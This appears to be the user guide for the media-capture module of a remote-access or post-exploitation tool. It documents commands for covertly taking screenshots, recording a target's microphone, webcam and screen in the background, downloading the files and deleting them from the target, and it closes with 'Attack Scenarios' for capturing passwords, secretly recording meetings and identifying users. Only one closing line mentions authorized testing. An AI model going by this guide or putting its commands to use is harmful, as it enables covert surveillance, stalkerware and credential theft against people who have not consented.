# Screen & Media Capture Implementation Guide

## Overview

Comprehensive screen, audio, and webcam capture capabilities for surveillance and evidence collection.

## Implementation Details

### Architecture

- **Module**: `features/media_capture_tool.py`
- **Classes**:
  - `ScreenCapture` - Screenshot functionality
  - `AudioCapture` - Microphone recording
  - `WebcamCapture` - Webcam image capture
  - `ScreenRecorder` - Video screen recording
- **Log Directories**:
  - `logs/screenshots/` - Screenshot images
  - `logs/audio/` - Audio recordings
  - `logs/webcam/` - Webcam captures
  - `logs/recordings/` - Screen recordings

## Screenshot Capture

### Commands

#### Single Screenshot

```bash
screenshot
```

**What happens:**

- Captures current screen
- Saves as PNG with timestamp
- Returns file path

**Response:**

```
[+] Screenshot saved: logs/screenshots/screenshot_20251004_143022.png
```

**Use case:**

- Capture current screen state
- Collect evidence
- Monitor user activity

---

#### Multiple Screenshots

```bash
screenshot_multi <count> <interval>
```

**Parameters:**

- `count`: Number of screenshots (default: 5)
- `interval`: Seconds between captures (default: 2)

**Example:**

```bash
screenshot_multi 10 3
# Takes 10 screenshots, 3 seconds apart
```

**Response:**

```
[+] Capturing 10 screenshots with 3 second interval...
[+] Screenshot 1/10 saved
[+] Screenshot 2/10 saved
...
[+] All screenshots captured successfully
```

**Use case:**

- Monitor activity over time
- Capture slideshow or presentation
- Document workflow

---

#### List Screenshots

```bash
screenshot_list
```

**Response:**

```
[+] Screenshots:
  - screenshot_20251004_143022.png (1.2 MB)
  - screenshot_20251004_143025.png (1.1 MB)
  - screenshot_20251004_143028.png (1.3 MB)
```

---

### Download Screenshots

```bash
download logs/screenshots/screenshot_20251004_143022.png
```

### Troubleshooting

**Issue: "Screenshot feature not available"**

```bash
# Install Pillow and pyautogui
pip3 install Pillow pyautogui
```

**Issue: Black screenshots on macOS**

```
System Preferences > Security & Privacy > Privacy > Screen Recording
Add Terminal or Python
```

**Issue: Large file sizes**

- Screenshots are full resolution
- Typical size: 0.5-3 MB per image
- Consider screenshot_multi interval to reduce storage

## Audio Recording

### Commands

#### Background Audio Recording (Recommended)

```bash
audio_start
```

**What happens:**

- Starts continuous audio recording in background
- Non-blocking - returns immediately
- Recording continues until stopped
- Supports multiple audio input methods (sox, ffmpeg, arecord)

**Response:**

```
[+] Background audio recording started: logs/audio/audio_20251005_143530.wav
```

**Check Status:**

```bash
audio_status
```

**Response:**

```
Audio recording in progress: logs/audio/audio_20251005_143530.wav
```

**Stop Recording:**

```bash
audio_stop
```

**Response:**

```
[+] Audio recording stopped and saved: logs/audio/audio_20251005_143530.wav (15.3 MB)
```

**Use case:**

- Monitor conversations during meetings
- Capture extended audio sessions
- Background surveillance

---

#### Fixed Duration Recording (Legacy)

```bash
audio_record <seconds>
```

**Parameter:**

- `seconds`: Duration in seconds (default: 10)

**Example:**

```bash
audio_record 30
# Records 30 seconds of audio (blocks until complete)
```

**Response:**

```
[+] Audio recorded: logs/audio/audio_20251005_143530.wav
```

**Use case:**

- Quick audio snippets
- When exact duration is known
- Legacy compatibility

---

#### List Audio Files

```bash
audio_list
```

**Response:**

```
[+] Audio recordings:
  - audio_20251005_143530.wav (15.3 MB)
  - audio_20251005_141200.wav (3.2 MB)
```

---

### Download Audio

```bash
download logs/audio/audio_20251005_143530.wav
```

### Troubleshooting

**Issue: "Audio recording requires dependencies"**

The audio feature supports multiple methods with automatic fallback:

**Method 1: PyAudio (Cross-platform)**

```bash
# macOS
brew install portaudio
pip3 install pyaudio

# Ubuntu/Debian
sudo apt-get install portaudio19-dev python3-pyaudio
pip3 install pyaudio

# Fedora/CentOS
sudo dnf install portaudio-devel
pip3 install pyaudio
```

**Method 2: System Commands (Fallback)**

- macOS: Uses `sox` or `ffmpeg`
- Linux: Uses `arecord` or `ffmpeg`
- Windows: Requires `ffmpeg`

```bash
# Install ffmpeg
# macOS
brew install ffmpeg

# Ubuntu/Debian
sudo apt-get install ffmpeg

# Fedora/CentOS
sudo dnf install ffmpeg

# macOS (sox alternative)
brew install sox
```

**Issue: "No microphone detected"**

```bash
# Linux - list audio devices
arecord -l

# macOS - check microphone permissions
System Preferences > Security & Privacy > Privacy > Microphone
Add Terminal or Python

# Windows
Settings > Privacy > Microphone
Allow apps to access your microphone
```

**Issue: Poor audio quality**

- Default: 44100 Hz, 16-bit stereo (PyAudio)
- CD quality for system commands
- WAV format (uncompressed)
- File size: ~10 MB per minute

## Webcam Capture

### Commands

#### Background Webcam Recording (New)

```bash
webcam_start
```

**What happens:**

- Starts continuous webcam video recording in background
- Non-blocking - returns immediately
- Recording continues until stopped
- Supports ffmpeg and OpenCV methods
- Default resolution: 640x480 at 15fps

**Response:**

```
[+] Background webcam recording started: logs/webcam/webcam_recording_20251005_144500.mp4
```

**Check Status:**

```bash
webcam_status
```

**Response:**

```
Webcam recording in progress: logs/webcam/webcam_recording_20251005_144500.mp4
```

**Stop Recording:**

```bash
webcam_stop
```

**Response:**

```
[+] Webcam recording stopped and saved: logs/webcam/webcam_recording_20251005_144500.mp4 (25.7 MB)
```

**Use case:**

- Monitor user over extended period
- Record video evidence
- Continuous surveillance

---

#### Capture Single Image (Legacy)

```bash
webcam_snap
```

**What happens:**

- Accesses default webcam
- Captures single frame
- Saves as JPG with timestamp

**Response:**

```
[+] Webcam image saved: logs/webcam/webcam_20251005_144500.jpg
```

**Use case:**

- Identify target user
- Quick photo capture
- Legacy compatibility

---

#### List Webcam Media

```bash
webcam_list
```

**Response:**

```
[+] Webcam images and videos:
  - webcam_recording_20251005_144500.mp4 (25.7 MB)
  - webcam_20251005_144500.jpg (0.8 MB)
```

---

### Download Webcam Media

```bash
download logs/webcam/webcam_recording_20251005_144500.mp4
download logs/webcam/webcam_20251005_144500.jpg
```

### Troubleshooting

**Issue: "Webcam not available" or "opencv-python library required"**

```bash
# Install opencv-python
pip3 install opencv-python

# Test webcam
python3 -c "import cv2; cam = cv2.VideoCapture(0); print('OK' if cam.isOpened() else 'Failed')"
```

**Issue: "Could not access webcam"**

**Linux:**

```bash
# Check webcam permissions
ls -l /dev/video*
sudo usermod -a -G video $USER

# Restart session for group change
```

**macOS:**

```
System Preferences > Security & Privacy > Privacy > Camera
Add Terminal or Python
```

**Windows:**

```
Settings > Privacy > Camera
Allow apps to access your camera
```

**Issue: Black image or "ffmpeg required"**

- Webcam in use by another application
- Insufficient permissions
- Webcam cover/blocked
- For video recording, install ffmpeg:

```bash
# macOS
brew install ffmpeg

# Ubuntu/Debian
sudo apt-get install ffmpeg

# Fedora/CentOS
sudo dnf install ffmpeg

# Windows
# Download from https://ffmpeg.org/download.html
```

## Screen Recording

### Commands

#### Timed Recording

```bash
record_screen <duration> <fps>
```

**Parameters:**

- `duration`: Seconds to record (default: 10)
- `fps`: Frames per second (default: 15)

**Example:**

```bash
record_screen 60 30
# Records 60 seconds at 30 FPS
```

**Response:**

```
[+] Recording screen for 60 seconds at 30 FPS...
[+] Recording complete: logs/recordings/screen_recording_20251004_150000.mp4
[+] File size: 45.2 MB
```

**Use case:**

- Record demonstrations
- Capture video evidence
- Monitor extended activity

---

#### Background Recording (Recommended)

```bash
record_start [max_duration]
```

**Parameter:**

- `max_duration`: Maximum seconds (optional, extracted from command if provided, default: 3600 = 1 hour)

**Example:**

```bash
record_start
# Starts background recording with default 1 hour max

record_start 1800
# Starts background recording, max 30 minutes
```

**Response:**

```
[+] Background recording started: logs/recordings/screen_recording_20251005_150000.mp4
```

**Check status:**

```bash
record_status
```

**Response:**

```
Recording in progress: logs/recordings/screen_recording_20251005_150000.mp4
```

**Stop recording:**

```bash
record_stop
```

**Response:**

```
[+] Recording stopped and saved: logs/recordings/screen_recording_20251005_150000.mp4 (32.5 MB)
```

---

#### List Recordings

```bash
record_list
```

**Response:**

```
[+] Screen recordings:
  - screen_recording_20251005_150000.mp4 (32.5 MB)
  - screen_recording_20251005_143000.mp4 (15.2 MB)
```

---

### Download Recording

```bash
download logs/recordings/screen_recording_20251005_150000.mp4
```

### Troubleshooting

**Issue: "Screen recording requires dependencies"**

```bash
pip3 install opencv-python numpy mss imageio imageio-ffmpeg

# For best quality, install ffmpeg:
# macOS:
brew install ffmpeg

# Ubuntu/Debian:
sudo apt-get install ffmpeg

# Fedora/CentOS:
sudo dnf install ffmpeg
```

**Issue: Large file sizes**

**FPS Guidelines:**

- 10 fps: Small files (~3-5 MB/min at 720p)
- 15 fps: Balanced (~4-8 MB/min at 720p) ✅ Default
- 24 fps: Smooth (~6-12 MB/min at 720p)
- 30 fps: High quality (~8-15 MB/min at 720p)

**Solution:**

```bash
# Use lower FPS for longer recordings
record_screen 300 10  # 5 minutes at 10 FPS

# Or shorter duration at higher quality
record_screen 60 30   # 1 minute at 30 FPS
```

**Issue: Slow/choppy recording**

- Install ffmpeg for better performance
- Close resource-intensive applications
- Use lower FPS (10-12)
- Reduce recording duration

**Issue: Black screen on macOS**

```
System Preferences > Security & Privacy > Privacy > Screen Recording
Add Terminal or Python
Restart application
```

**Issue: "No module named 'cv2'"**

```bash
pip3 install opencv-python
```

**Issue: "No module named 'mss'"**

```bash
pip3 install mss imageio imageio-ffmpeg
```

## Limitations

### Screenshots

- Full screen only (no partial)
- No multi-monitor selection
- Static images only
- File size: 0.5-3 MB each

### Audio

- Background recording supported (audio_start/stop)
- Fixed duration recording available (audio_record)
- Microphone only (no system audio on most platforms)
- WAV format (uncompressed, large files)
- ~10 MB per minute
- Multiple method support (pyaudio, sox, ffmpeg, arecord)
- Automatic fallback to available tools

### Webcam

- Background video recording supported (webcam_start/stop)
- Single frame snapshots available (webcam_snap)
- Default camera only (camera index 0)
- Must not be in use by other applications
- Resolution depends on hardware (default 640x480 for video)
- Video format: MP4
- Requires opencv-python or ffmpeg

### Screen Recording

- CPU/memory intensive
- Large file sizes
- FPS impacts quality and size
- Not suitable for hours-long recordings
- Max practical duration: ~1 hour

## Performance Impact

### CPU Usage

- Screenshots: Minimal (quick capture)
- Audio: Low (recording thread)
- Webcam: Low (single frame)
- Recording: **High** (continuous capture + encoding)

### Memory Usage

- Screenshots: ~10 MB per image
- Audio: Buffered (minimal)
- Webcam: ~5 MB per frame
- Recording: **Significant** (~100-500 MB buffer)

### Disk Usage

- Screenshots: 0.5-3 MB each
- Audio: ~10 MB per minute
- Webcam: 0.5-2 MB each
- Recording: 5-15 MB per minute (FPS dependent)

## Best Practices

### Screenshots

```bash
# Quick evidence
screenshot

# Monitor activity over time
screenshot_multi 20 5  # 20 shots, 5 sec apart

# Download specific images
screenshot_list
download logs/screenshots/screenshot_TIMESTAMP.png
```

### Audio

```bash
# Background recording (recommended for meetings/conversations)
audio_start
# ... wait for desired duration ...
audio_stop
audio_list
download logs/audio/audio_TIMESTAMP.wav

# Short fixed-duration recordings
audio_record 30
download logs/audio/audio_TIMESTAMP.wav

# Check status during recording
audio_status
```

### Screen Recording

```bash
# For demos/presentations
record_screen 120 24  # 2 min, 24 FPS

# For surveillance
record_start 3600     # Background, 1 hour max
record_status         # Check progress
record_stop           # Stop when needed
```

### Resource Management

```bash
# Check file sizes before downloading
screenshot_list
audio_list
record_list

# Download and delete to free space
download logs/recordings/video.mp4
# Then on target: rm logs/recordings/video.mp4
```

## Attack Scenarios

### Scenario 1: Password Capture

```bash
# User about to enter password
screenshot  # Before
# Wait for typing
screenshot  # After
# Visual evidence of password field
```

### Scenario 2: Meeting Recording

```bash
# Record video conference with audio and webcam
record_start 3600  # Screen recording, 1 hour max
audio_start        # Audio recording in background
webcam_start       # Webcam recording in background

# Check status periodically
record_status
audio_status
webcam_status

# Stop all when meeting ends
record_stop
audio_stop
webcam_stop

# Download all media
record_list
audio_list
webcam_list
download logs/recordings/screen_recording_TIMESTAMP.mp4
download logs/audio/audio_TIMESTAMP.wav
download logs/webcam/webcam_recording_TIMESTAMP.mp4
```

### Scenario 3: Activity Monitoring

```bash
# Monitor work session
screenshot_multi 100 30  # Every 30 sec for 50 min

# Download and analyze later
screenshot_list
```

### Scenario 4: User Identification & Monitoring

```bash
# Quick snapshot for user ID
webcam_snap
download logs/webcam/webcam_TIMESTAMP.jpg

# Extended monitoring
webcam_start
# ... monitor for desired duration ...
webcam_status
webcam_stop
webcam_list
download logs/webcam/webcam_recording_TIMESTAMP.mp4
```

## Summary

Media capture features:
✅ Screenshots - Single and batch captures
✅ Audio recording - Background and fixed duration, multiple fallback methods
✅ Webcam capture - Video recording and single snapshots
✅ Screen recording - Background and fixed duration with multiple methods
✅ Status monitoring - Check active recordings in real-time
✅ Multiple formats - PNG, WAV, JPG, MP4
✅ Timestamped files - Easy organization
✅ Cross-platform support - macOS, Linux, Windows
✅ Automatic fallback - Uses available tools (ffmpeg, sox, opencv, etc.)

**Key Features:**

- Background recording for audio, screen, and webcam
- Non-blocking operations - continue other tasks while recording
- Status checking for all active recordings
- Comprehensive error handling and troubleshooting
- Multiple implementation methods with automatic fallback

**Use responsibly in authorized testing only.**
